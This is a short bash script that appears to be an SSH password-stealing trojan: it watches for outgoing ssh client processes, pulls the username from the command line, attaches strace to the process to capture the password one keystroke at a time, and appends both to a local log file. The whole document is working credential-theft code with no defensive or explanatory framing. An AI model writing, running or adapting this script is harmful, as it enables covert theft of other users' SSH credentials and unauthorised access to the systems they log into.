#!/bin/bash

while :
do
	id=`sudo ps aux | grep ssh | grep @ | awk {'print $2'}`
	if [ $id ]
	then
# find user
		sudo ps aux | grep ssh | grep  @ > logUser.txt
		name=`sudo cut -d ':' -f3 logUser.txt | awk {'print $3'} | cut -d '@' -f1` 
		echo "User : $name" >> log_sshtrojan2.txt
# find password
	
		strace -p $id -e read 2> filterRead.txt
		grep -w 'read(4, ".", 1)' filterRead.txt >  filterPw.txt
 		c=`cut -d '"' -f2 filterPw.txt`
		pw=''
		for i in $c
		do
			pw=$pw$i
		done
		echo -e "Password:  $pw\t" >> log_sshtrojan2.txt
		break
	fi
done